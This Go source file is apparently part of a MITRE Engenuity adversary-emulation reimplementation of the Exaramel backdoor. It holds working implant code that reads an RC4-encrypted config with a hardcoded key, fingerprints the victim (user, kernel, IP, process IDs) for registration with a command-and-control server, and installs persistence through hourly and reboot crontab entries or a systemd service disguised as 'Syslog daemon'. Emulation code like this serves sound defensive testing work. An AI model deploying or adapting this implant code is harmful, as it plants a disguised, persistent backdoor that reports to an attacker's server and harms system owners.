package configur

import (
	"crypto/rc4"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"strconv"
	"strings"
	"syscall"

	uuid "github.com/satori/go.uuid"

	"attackevals.mitre-engenuity.org/exaramel/logger"
	"attackevals.mitre-engenuity.org/exaramel/networker"
)

const SockAddr = "/tmp/.applocktx"
const proto = "https://"
const apiRoute = "/api/v1"

// Encryption key used in RC4 encryption when encrypting or decrypting configuration file.
var ConfigKey = []byte("odhyrfjcnfkdtslt")

var defaultServerAddress string

type Config struct {
	// URLs server list
	Hosts []string
	// Proxy HTTP URL to connect to servers (optional)
	Proxy string
	// EXARAMEL version
	Version string
	// UUID, used probably to identify an Exaramel instance
	Guid string
	// Time span of the last run pause between two mails loop run.
	// This field is updated before each execution pause.
	Next int64
	// Date when EXARAMEL last paused its execution
	Datetime string
	// Timeout value given to HTTP/HTTPS implementation
	Timeout int
	// Time during which EXARAMEL paused its execution between two
	// main loop iterations. This field is used when EXARAMEL
	// fails to get a time interval from its control server.
	Def int64
}

var ExaramelConfig Config
var sigs = make(chan os.Signal, 1)

// Checks to make sure no other instances of Exaramel are running.
// Sets up signal handling.
// Actual specimen was found to automatically establish persistence.
// However, for the purposes of the evaluation, persistence is setup when manually requested instead.
// Performs registration with server.
func Initialize(c2Server string) (net.Listener, error) {
	sock, err := CreateSocket()
	if err != nil {
		logger.Error("App has already started!")
		return sock, err
	}

	SetupSignalHandler(sock)
	if err = ReadConfig(); err != nil {
		return sock, err
	}
	// if err = SetupPersistence(); err != nil {
	// 	return sock, err
	// }
	c2Url := proto + c2Server + apiRoute
	SetDefaultServerAddress(c2Url)
	networker.SetC2Server(c2Url)
	if err = SetupBeaconInfo(); err != nil {
		logger.Error(err)
		return sock, err
	}
	return sock, nil
}

func SetDefaultServerAddress(address string) {
	defaultServerAddress = address
}

// Creates a named UNIX Domain socket.
// If this fails, we expect that another instance of Exaramel is currently running, and die.
func CreateSocket() (net.Listener, error) {
	return net.Listen("unix", SockAddr)
}

func generateGUID() string {
	guid := uuid.NewV4().String()
	guid = "exaramel-implant"
	return guid
}

// Get preferred outbound ip of this machine
func GetOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:53")
	if err != nil {
		return err.Error()
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return strings.Split(localAddr.String(), ":")[0]
}

func SetupBeaconInfo() error {
	myGuid := generateGUID()
	currUser, err := user.Current()
	if err != nil {
		return err
	}
	username := currUser.Username
	platform, err := exec.Command("uname", "-a").Output()
	if err != nil {
		return err
	}
	curr_dir, err := os.Getwd()
	if err != nil {
		return err
	}
	networker.SetAuthValues(myGuid, username, string(platform[:]), GetOutboundIP(), strconv.Itoa(os.Getpid()), strconv.Itoa(os.Getppid()), curr_dir)
	return nil
}

// Signal handler to kill agent when any of SIGINT, SIGTERM, SIGQUIT, or SIGKILL are received.
func SetupSignalHandler(sock net.Listener) chan os.Signal {
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT, syscall.SIGKILL)

	go func() {
		sig := <-sigs
		fmt.Println(sig)
		sock.Close()
		os.Exit(1)
	}()
	return sigs
}

// Reads config file in Exaramel's current directory. If none found, then call WriteConfig()
func ReadConfig() error {
	configFileName := "configtx.json"
	if _, err := os.Stat(configFileName); err == nil {
		configFile, err := os.Open(configFileName)
		if err != nil {
			return WriteConfig()
		}
		defer configFile.Close()
		configEnc, err := ioutil.ReadAll(configFile)
		if err != nil {
			return WriteConfig()
		}

		cipher, err := rc4.NewCipher(ConfigKey)
		if err != nil {
			return WriteConfig()
		}
		configDec := make([]byte, len(configEnc))
		cipher.XORKeyStream(configDec, configEnc)

		json.Unmarshal(configDec, &ExaramelConfig)
		return nil
	} else {
		return WriteConfig()
	}
}

// Writes configuration to a file in the current directory.
// If Exaramel does not hold configuration values, a default configuration is used and written.
func WriteConfig() error {
	if len(ExaramelConfig.Hosts) == 0 {
		ExaramelConfig = Config{
			Hosts:    []string{defaultServerAddress},
			Proxy:    "",
			Version:  "1",
			Next:     20,
			Datetime: "",
			Timeout:  30,
			Def:      20,
		}
	}
	configDec, err := json.Marshal(ExaramelConfig)
	if err != nil {
		return err
	}

	cipher, err := rc4.NewCipher(ConfigKey)
	if err != nil {
		return err
	}
	configEnc := make([]byte, len(configDec))
	cipher.XORKeyStream(configEnc, configDec)

	err = ioutil.WriteFile("configtx.json", configEnc, 0644)
	if err != nil {
		return err
	}

	return nil
}

// If Exaramel is started in a low priv context, the current user's crontab is used for persistence.
// Only applicable for Linux.
func SetupCrontabPersistence() error {
	logger.Info("Setting up Crontab persistence")
	mydir, err := os.Getwd()
	if err != nil {
		return err
	}

	exeName, err := os.Executable()
	if err != nil {
		return err
	}

	cronMinuteString := fmt.Sprintf("1 * * * * cd %s && %s\n", mydir, exeName)
	cronStartupString := fmt.Sprintf("@reboot cd %s && %s\n", mydir, exeName)

	userCronContents, err := exec.Command("crontab", "-l").Output()
	if err != nil {
		userCronContents = []byte("")
	}
	newCronContents := string(userCronContents[:]) + "\n" + cronMinuteString + cronStartupString
	cronCommand := exec.Command("crontab", "-")
	cronCommandStdin, err := cronCommand.StdinPipe()
	if err != nil {
		return err
	}
	go func() {
		defer cronCommandStdin.Close()
		io.WriteString(cronCommandStdin, newCronContents)
	}()

	output, err := cronCommand.Output()
	if err != nil {
		return err
	}
	fmt.Println(string(output[:]))
	return nil
}

// The user's crontab is removed when deleting Exaramel's crontab persistence.
func DeleteCrontabPersistence() error {
	err := exec.Command("crontab", "-r").Run()
	if err != nil {
		return err
	}
	return nil
}

// If Exaramel is started in a high priv context, Exaramel is added as a systemd service.
// Only applicable for Linux.
func SetupSystemdPersistence() error {
	logger.Info("Setting up Systemd persistence")
	progPath, err := os.Executable()
	if err != nil {
		return err
	}
	currDir, err := os.Getwd()
	if err != nil {
		return err
	}
	serviceFileContents := `[Unit]
Description=Syslog daemon

[Service]
WorkingDirectory=`
	serviceFileContents += currDir + "\n"
	serviceFileContents += "ExecStartPre=/bin/rm -f /tmp/.applocktx\n"
	serviceFileContents += "ExecStart=" + progPath + "\n"
	serviceFileContents += `Restart=always

[Install]
WantedBy=multi-user.target`

	serviceFileContentsBytes := []byte(serviceFileContents)

	err = ioutil.WriteFile("/etc/systemd/system/syslogd.service", serviceFileContentsBytes, 0644)
	if err != nil {
		return err
	}

	err = exec.Command("systemctl", "enable", "syslogd.service").Run()
	if err != nil {
		return err
	}
	err = exec.Command("systemctl", "daemon-reload").Run()
	if err != nil {
		return err
	}
	return nil
}

// The service is disabled and removed when systemd persistence is removed.
func DeleteSystemdPersistence() error {
	err := exec.Command("systemctl", "stop", "syslogd.service").Run()
	if err != nil {
		return err
	}
	err = exec.Command("systemctl", "disable", "syslogd.service").Run()
	if err != nil {
		return err
	}
	for i := 0; i < 3; i++ {
		err = exec.Command("systemctl", "daemon-reload").Run()
		if err != nil {
			return err
		}
	}
	err = exec.Command("systemctl", "reset-failed").Run()
	if err != nil {
		return err
	}
	err = os.Remove("/etc/systemd/system/syslogd.service")
	if err != nil {
		return err
	}
	return nil
}

// If Exaramel is run as root, systemd persistence is used. Otherwise, crontab persistence is used.
func SetupPersistence() error {
	logger.Info("My privilege level is: " + strconv.Itoa(os.Geteuid()))
	if os.Geteuid() == 0 {
		return SetupSystemdPersistence()
	} else {
		return SetupCrontabPersistence()
	}
}

// Depending on the privilege level, the appropriate persistence method is deleted.
func DeletePersistence() error {
	if os.Geteuid() == 0 {
		return DeleteSystemdPersistence()
	} else {
		return DeleteCrontabPersistence()
	}
}
